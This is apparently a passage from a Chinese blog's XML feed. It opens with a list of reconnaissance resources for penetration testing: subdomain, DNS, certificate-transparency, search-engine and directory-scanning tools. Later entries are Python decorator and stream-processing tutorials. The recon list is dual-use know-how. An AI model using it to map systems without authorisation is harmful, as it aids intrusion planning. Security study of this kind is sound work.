（3）nmap工具</code></pre><p>子域名检测</p><pre><code>（1）Layer子域名挖掘机（2）K8（3）wydomain（4）Sublist3r dnsmaper（5）subDomainsBrute（6）Maltego CE（7）dnsrecon(kali自带)重点推荐Layer子域名挖掘机、Sublist3r和subDomainsBrute</code></pre><p>证书透明度公开曰志枚举</p><pre><code>（1）首推好用网站：https://crt.sh（2）次推好用网站：https://censys.io/（3）其他网站：https://phpinfo.me/domain</code></pre><p>通过DNS解析找到IP地址</p><pre><code>（1）ping（2）nslookup（3）dig工具（4）dnsenum工具（5）站长之家</code></pre><p>谷歌搜索（其实百度也还行）</p><pre><code>关键字            说明site            指定域名inurl           URL 中存在关键字的网页intext          网页正文中的关键字filetype        指定文件类型intitie         网页标题中的关键字link            link:baidu.com 即表示返回所有和 baidu.com 做了链接的URLinfo            查找指定站点的一些基本信息cache           搜索Google 里关于某些内容的缓存关键字尽量用“”引起来    </code></pre><p>网络空间搜索引擎（AMAZING MIGHTYYYY!!!!）<br><a href="https://www.zoomeye.org/">钟馗之眼zoomeye</a><br><a href="https://www.shodan.io/">傻蛋Shodan</a><br><a href="https://fofa.info/">佛法FOFA</a></p><p>CMS及Web指纹识别</p><pre><code>御剑Web 指纹识别、WebRobo 、椰树、轻量WEB指纹识别建议WhatWeb（Kali自带）</code></pre><p><a href="http://whatweb.bugscaner.com/look/">BugScaner</a><br><a href="http://www.yunsee.cn/finger.html">云悉指纹</a><br><a href="https://whatweb.net/">WhatWeb</a></p><p>收集网站目录及隐藏的敏感文件</p><pre><code>（1）DirBuster（2）御剑后台扫描珍藏版（3）wwwscan（4）Spinder.py（5）Sensitivefilescan（6）Weakfilescan</code></pre><h5 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h5><p>自己想办法。</p><h4 id="PDF总结文件"><a href="#PDF总结文件" class="headerlink" title="PDF总结文件"></a>PDF总结文件</h4><p><a href="https://file.notion.so/f/s/45a2de32-2395-447a-8048-84af1c2afea7/%E8%B5%84%E4%BA%A7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.pdf?id=9616b249-1acc-41e2-b6bc-cda21d12e7c4&table=block&spaceId=62bfa233-9aa4-4dc0-b934-b6b37b358f41&expirationTimestamp=1689840000000&signature=fJvscjic-yAIr5i9NttS-lJXFz5pmeuYifjI4sLStaw&downloadName=%E8%B5%84%E4%BA%A7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.pdf">文件在这里</a></p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p><strong>无论人生上了哪一层台阶 ，阶下有人在仰望你，阶上亦有人在俯视你；</strong><br><strong>你抬头自卑，低头自得，唯有平视，才能看到真实的自已。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python</title>
      <link href="/2023/03/19/Python/"/>
      <url>/2023/03/19/Python/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python装饰器&amp;流处理技术</title>
      <link href="/2023/03/19/Python%E8%A3%85%E9%A5%B0%E5%99%A8-%E6%B5%81%E5%A4%84%E7%90%86%E6%8A%80%E6%9C%AF/"/>
      <url>/2023/03/19/Python%E8%A3%85%E9%A5%B0%E5%99%A8-%E6%B5%81%E5%A4%84%E7%90%86%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<p>当在装饰器中使用全局变量时，需要注意以下几点：</p><ol><li>在装饰器中声明全局变量需要使用<code>global</code>关键字。</li><li>在装饰器中使用全局变量，需要确保该变量已经被定义和初始化，否则会引发<code>NameError</code>异常。</li><li>全局变量可能会被多个线程或进程访问，因此需要考虑并发安全问题。</li><li>在装饰器中使用全局变量可能会导致代码的可读性和可维护性降低，因此应尽可能避免使用全局变量。<br>以下是一个简单的例子，演示如何在装饰器中使用全局变量：<pre class="line-numbers language-python"><code class="language-python">count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">counter</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">global</span> count     count <span class="token operator">+=</span> <span class="token number">1</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;func.__name__&amp;#125; was called &amp;#123;count&amp;#125; times."</span><span class="token punctuation">)</span>     <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span> <span class="token keyword">return</span> wrapper@counter<span class="token keyword">def</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello, world!"</span><span class="token punctuation">)</span>foo<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Function foo was called 1 times.</span>foo<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Function foo was called 2 times.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>在上面的例子中，我们定义了一个全局变量<code>count</code>，并在装饰器<code>counter</code>中使用了它。装饰器<code>counter</code>用于统计函数被调用的次数，每次调用时<code>count</code>加1，并输出调用次数。函数<code>foo</code>被装饰后，每次调用都会输出调用次数。</li></ol><p>是的，Python装饰器里可以使用 <code>global</code> 关键字。 </p><p>装饰器本质上是一个函数，因此它可以访问任何全局变量。如果您希望在装饰器内部更改全局变量的值，则需要在函数内部将变量声明为全局变量。在 Python 中，您可以使用 <code>global</code> 关键字来实现这一点。</p><p>以下是一个示例装饰器，它使用全局变量来记录函数调用次数：</p><pre class="line-numbers language-python"><code class="language-python">count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">count_calls</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">global</span> count        count <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;func.__name__&amp;#125; has been called &amp;#123;count&amp;#125; times"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>    <span class="token keyword">return</span> wrapper@count_calls<span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个例子中，我们使用 <code>global</code> 关键字声明了 <code>count</code> 变量，并在 <code>count_calls</code> 装饰器函数的 <code>wrapper</code> 函数内部对其进行了修改。每次调用 <code>my_function</code> 函数时，装饰器都会增加 <code>count</code> 的值，并打印出调用次数。除了在装饰器函数内部使用 <code>global</code> 关键字，还可以在装饰器函数外部使用 <code>global</code> 关键字来声明全局变量，并在装饰器内部访问和修改该变量的值。下面是一个示例：</p><pre class="line-numbers language-python"><code class="language-python">count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">count_calls</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">global</span> count        count <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;func.__name__&amp;#125; has been called &amp;#123;count&amp;#125; times"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>    <span class="token keyword">return</span> wrapper@count_calls<span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> count    <span class="token keyword">if</span> count <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hi there!"</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个例子中，我们声明了全局变量 <code>count</code>，并在装饰器内部和外部使用了 <code>global</code> 关键字。在 <code>my_function</code> 函数内部，我们检查 <code>count</code> 的值是否为偶数，并打印不同的消息。由于装饰器在每次调用 <code>my_function</code> 函数时都会增加 <code>count</code> 的值，因此 <code>my_function</code> 函数每次都会打印不同的消息。</p><p>需要注意的是，在使用全局变量时要小心，因为全局变量可能会在代码中的任何地方进行修改，这可能会导致出现意外的行为。因此，最好将全局变量用于只读目的，或者在使用时采用适当的同步机制来避免竞争条件。当然，除了 <code>global</code> 关键字之外，还可以使用其他的方式来在装饰器中引用外部变量。以下是一些常用的方法：</p><ol><li>使用闭包：在装饰器函数内部定义一个内部函数，并在内部函数中引用外部变量。由于内部函数可以访问外部函数的变量，因此可以通过闭包的方式在装饰器内部使用外部变量。例如：</li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">count_calls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    count <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">def</span> <span class="token function">decorator</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>            nonlocal count            count <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;func.__name__&amp;#125; has been called &amp;#123;count&amp;#125; times"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>        <span class="token keyword">return</span> wrapper    <span class="token keyword">return</span> decorator@count_calls<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个例子中，我们在装饰器函数 <code>count_calls</code> 内部定义了一个内部函数 <code>decorator</code>，并在该函数中定义了变量 <code>count</code>。在 <code>wrapper</code> 函数内部，我们使用 <code>nonlocal</code> 关键字来引用 <code>count</code> 变量，并在每次调用被装饰的函数时增加其值。</p><ol start="2"><li>使用类：将装饰器实现为一个类，并在类中引用外部变量。由于类实例可以存储变量状态，因此可以通过类的方式在装饰器内部使用外部变量。例如：</li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">CountCalls</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> func<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>func <span class="token operator">=</span> func        self<span class="token punctuation">.</span>count <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">def</span> <span class="token function">__call__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>count <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;self.func.__name__&amp;#125; has been called &amp;#123;self.count&amp;#125; times"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>@CountCalls<span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个例子中，我们定义了一个类 <code>CountCalls</code>，并在类的构造函数中定义了变量 <code>count</code>。在 <code>__call__</code> 方法中，我们使用 <code>self.count</code> 来引用 <code>count</code> 变量，并在每次调用被装饰的函数时增加其值。</p><p>无论是使用 <code>global</code> 关键字、闭包还是类，都可以在装饰器中引用外部变量。选择哪种方法取决于具体的需求和个人偏好。除了在装饰器中使用 <code>global</code> 关键字或闭包或类等方式引用外部变量，还可以将变量作为参数传递给装饰器。这种方式通常适用于装饰器函数需要访问某些变量，但不希望将这些变量声明为全局变量的情况。以下是一个示例：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">count_calls</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">decorator</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>            nonlocal count            count <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;func.__name__&amp;#125; has been called &amp;#123;count&amp;#125; times"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>        <span class="token keyword">return</span> wrapper    <span class="token keyword">return</span> decorator@count_calls<span class="token punctuation">(</span>count<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个例子中，我们将变量 <code>count</code> 作为参数传递给 <code>count_calls</code> 装饰器，并在装饰器函数 <code>decorator</code> 内部使用 <code>nonlocal</code> 关键字引用该变量。在每次调用被装饰的函数时，我们都会增加 <code>count</code> 的值，并打印出该函数被调用的次数。</p><p>需要注意的是，通过将变量作为参数传递给装饰器，我们可以更灵活地控制装饰器的行为，但同时也会增加代码的复杂度。因此，在选择使用这种方式时，需要权衡利弊，并根据具体的情况选择最适合的实现方式。除了在装饰器中使用 <code>global</code> 关键字、闭包、类或参数等方式引用外部变量之外，还可以使用 <code>functools</code> 模块中的 <code>wraps</code> 装饰器来保留被装饰函数的元信息。具体来说，<code>wraps</code> 装饰器可以用来保留被装饰函数的名称、文档字符串、参数签名等元信息，从而使得被装饰函数更加易于调试和理解。</p><p>以下是一个使用 <code>wraps</code> 装饰器的示例：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> functools <span class="token keyword">import</span> wraps<span class="token keyword">def</span> <span class="token function">my_decorator</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>    @wraps<span class="token punctuation">(</span>func<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""This is a wrapper function."""</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Before the function is called."</span><span class="token punctuation">)</span>        result <span class="token operator">=</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"After the function is called."</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> result    <span class="token keyword">return</span> wrapper@my_decorator<span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""This is a function."""</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个示例中，我们使用 <code>wraps</code> 装饰器来保留被装饰函数 <code>my_function</code> 的元信息，包括其名称、文档字符串等。这使得被装饰函数的调试和理解更加容易。需要注意的是，在使用 <code>wraps</code> 装饰器时，需要将其放在装饰器函数的内部，而不是外部。</p><p>总之，通过在装饰器中使用 <code>wraps</code> 装饰器，我们可以保留被装饰函数的元信息，从而提高代码的可读性和可维护性。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python装饰器&amp;流处理技术</title>
      <link href="/2023/03/19/Python%E8%A3%85%E9%A5%B0%E5%99%A8/"/>
      <url>/2023/03/19/Python%E8%A3%85%E9%A5%B0%E5%99%A8/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python装饰器&amp;流处理技术</title>
      <link href="/2023/03/18/Python%E8%A3%85%E9%A5%B0%E5%99%A8-%E6%B5%81%E5%A4%84%E7%90%86%E6%8A%80%E6%9C%AF/"/>
      <url>/2023/03/18/Python%E8%A3%85%E9%A5%B0%E5%99%A8-%E6%B5%81%E5%A4%84%E7%90%86%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h3 id="Python装饰器"><a href="#Python装饰器" class="headerlink" title="Python装饰器"></a>Python装饰器</h3><h4 id="解释概念"><a href="#解释概念" class="headerlink" title="解释概念"></a>解释概念</h4><p>Python中的装饰器是一种用于修改或扩展函数或类的行为的语法结构。装饰器通常是一个函数或类，它接受一个函数或类作为参数，并返回一个新的函数或类。</p><p>装饰器可以用于许多不同的目的，例如：</p><ol><li>添加日志记录或调试信息，以便跟踪函数的执行过程和结果。</li><li>对函数或类的参数进行验证或修改，以确保它们符合特定的规则或格式。</li><li>对函数或类进行缓存或记忆化，以避免重复计算或提高性能。</li><li>添加身份验证或授权逻辑，以确保只有授权用户才能调用函数或类。</li><li>实现面向切面编程（AOP），以分离横切关注点（如日志记录、性能统计等）和业务逻辑。<br>Python中的装饰器使用@语法来应用，例如：<pre class="line-numbers language-python"><code class="language-python">@decorator<span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># do something</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>这将把<code>my_function</code>函数传递给<code>decorator</code>装饰器函数，并将其替换为新的函数，该函数包装了原始函数并修改了其行为。</li></ol><h4 id="关于装饰器全局变量的使用（接口）"><a href="#关于装饰器全局变量的使用（接口）" class="headerlink" title="关于装饰器全局变量的使用（接口）"></a>关于装饰器全局变量的使用（接口）</h4><p>装饰器本质上是一个函数，因此它可以访问任何全局变量。<br>当在装饰器中使用全局变量时，需要注意以下几点：</p><ol><li>在装饰器中声明全局变量需要使用<code>global</code>关键字。</li><li>在装饰器中使用全局变量，需要确保该变量已经被定义和初始化，否则会引发<code>NameError</code>异常。</li><li>全局变量可能会被多个线程或进程访问，因此需要考虑并发安全问题。</li><li>在装饰器中使用全局变量可能会导致代码的可读性和可维护性降低，因此应尽可能避免使用全局变量。<br>以下是一个简单的例子，演示如何在装饰器中使用全局变量：<pre class="line-numbers language-python"><code class="language-python">count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">counter</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">global</span> count     count <span class="token operator">+=</span> <span class="token number">1</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;func.__name__&amp;#125; was called &amp;#123;count&amp;#125; times."</span><span class="token punctuation">)</span>     <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span> <span class="token keyword">return</span> wrapper@counter<span class="token keyword">def</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello, world!"</span><span class="token punctuation">)</span>foo<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Function foo was called 1 times.</span>foo<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Function foo was called 2 times.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>在上面的例子中，我们定义了一个全局变量<code>count</code>，并在装饰器<code>counter</code>中使用了它。<br>装饰器<code>counter</code>用于统计函数被调用的次数，每次调用时<code>count</code>加1，并输出调用次数。<br>函数<code>foo</code>被装饰后，每次调用都会输出调用次数。</li></ol><p>除了在装饰器函数内部使用 <code>global</code> 关键字，还可以在装饰器函数外部使用 <code>global</code> 关键字来声明全局变量，并在装饰器内部访问和修改该变量的值：</p><pre class="line-numbers language-python"><code class="language-python">count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">count_calls</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">global</span> count        count <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;func.__name__&amp;#125; has been called &amp;#123;count&amp;#125; times"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>    <span class="token keyword">return</span> wrapper@count_calls<span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> count    <span class="token keyword">if</span> count <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hi there!"</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个例子中，我们声明了全局变量 <code>count</code>，并在装饰器内部和外部使用了 <code>global</code> 关键字。<br>在 <code>my_function</code> 函数内部，我们检查 <code>count</code> 的值是否为偶数，并打印不同的消息。<br>由于装饰器在每次调用 <code>my_function</code> 函数时都会增加 <code>count</code> 的值，因此 <code>my_function</code> 函数每次都会打印不同的消息。</p><p>需要注意的是，在使用全局变量时要小心，因为全局变量可能会在代码中的任何地方进行修改，这可能会导致出现意外的行为。<br>因此，最好将全局变量用于只读目的，或者在使用时采用适当的同步机制来避免竞争条件。<br>当然，除了 <code>global</code> 关键字之外，还可以使用其他的方式来在装饰器中引用外部变量。以下是一些常用的方法：</p><ol><li>使用闭包：在装饰器函数内部定义一个内部函数，并在内部函数中引用外部变量<br>（由于内部函数可以访问外部函数的变量）</li><li>使用类：将装饰器实现为一个类，并在类中引用外部变量<br>（由于类实例可以存储变量状态）</li></ol><p>无论是使用 <code>global</code> 关键字、闭包还是类，都可以在装饰器中引用外部变量。<br>除了上面所提到的方法，还可以将变量作为参数传递给装饰器。<br>这种方式通常适用于装饰器函数需要访问某些变量，但不希望将这些变量声明为全局变量的情况。</p><p>通过将变量作为参数传递给装饰器，我们可以更灵活地控制装饰器的行为，但同时也会增加代码的复杂度。因此，在选择使用这种方式时，需要权衡利弊，并根据具体的情况选择最适合的实现方式。</p><p>除了在装饰器中使用 <code>global</code> 关键字、闭包、类或参数等方式引用外部变量之外，还可以使用 <code>functools</code> 模块中的 <code>wraps</code> 装饰器来保留被装饰函数的元信息。<br>具体来说，<code>wraps</code> 装饰器可以用来保留被装饰函数的名称、文档字符串、参数签名等元信息，从而使得被装饰函数更加易于调试和理解。</p><h3 id="流处理技术"><a href="#流处理技术" class="headerlink" title="流处理技术"></a>流处理技术</h3><h4 id="概念解析"><a href="#概念解析" class="headerlink" title="概念解析"></a>概念解析</h4><p>流处理技术是一种处理数据的方式，它是指持续接收和处理流式数据的方式。<br>与批处理不同，流处理将数据视为连续的数据流，而不是离散的数据集合。</p><h4 id="应用领域"><a href="#应用领域" class="headerlink" title="应用领域"></a>应用领域</h4><p>流处理技术的主要用途是实时分析和处理数据。<br>通过流处理技术，可以快速处理大量的<code>实时数据</code>，并从中提取有价值的信息。<br>流处理技术通常使用流处理引擎来实现，流处理引擎通常提供一系列的API和工具。<br>用于处理数据流、实时处理和聚合数据、分析数据和发送数据到其他系统。<br>流处理引擎还可以与其他系统和工具集成，例如数据库、数据仓库、消息队列等。</p><h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><p>在使用流处理技术时，需要考虑以下几个方面：<br>（1）数据来源和输入方式：从不同的数据源中读取实时数据流。<br>（2）流处理引擎的选择：根据具体的业务需求和系统架构选择适合的流处理引擎。<br>&emsp;&emsp;(Apache Flink、Apache Kafka Streams、Apache Spark Streaming等)<br>（3）数据处理逻辑：定义数据处理逻辑。<br>（4）数据输出方式：传输和存储处理后的数据。</p><h4 id="简单的示例"><a href="#简单的示例" class="headerlink" title="简单的示例"></a>简单的示例</h4><p>下面是个使用Flask和cv2框架编写的一个用于播放视频的Python流处理脚本</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> Response<span class="token keyword">import</span> cv2app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>camera <span class="token operator">=</span> cv2<span class="token punctuation">.</span>VideoCapture<span class="token punctuation">(</span><span class="token string">"1.mp4"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">generate_frames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span 